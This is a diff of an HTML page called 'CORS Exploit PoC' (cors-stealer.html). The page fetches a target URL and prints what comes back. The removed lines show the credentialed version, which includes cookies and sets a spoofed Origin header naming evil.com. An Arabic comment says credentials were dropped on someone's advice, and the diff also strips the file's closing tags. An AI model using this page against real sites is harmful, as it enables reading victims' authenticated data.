@@ -1,8 +1,7 @@
-<!-- Filename: cors-stealer.html -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>CORS Exploit PoC</title>
   <style>
     body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }
@@ -23,12 +22,9 @@
 
       try {
         const res = await fetch(target, {
-          method: 'GET',
-          mode: 'cors',
-          credentials: 'include', // try include cookies
-          headers: {
-            'Origin': 'https://evil.com' // simulate evil.com origin
-          }
+          method: "GET",
+          mode: "cors"
+          // حيدت credentials: "include" حسب نصيحتك لأنها تسبب خطأ CORS
         });
 
         resultBox.textContent += `Status: ${res.status}\n`;
@@ -38,7 +34,3 @@
       } catch (err) {
         resultBox.textContent += '\n❌ Exploit Failed:\n' + err;
       }
-    }
-  </script>
-</body>
-</html>
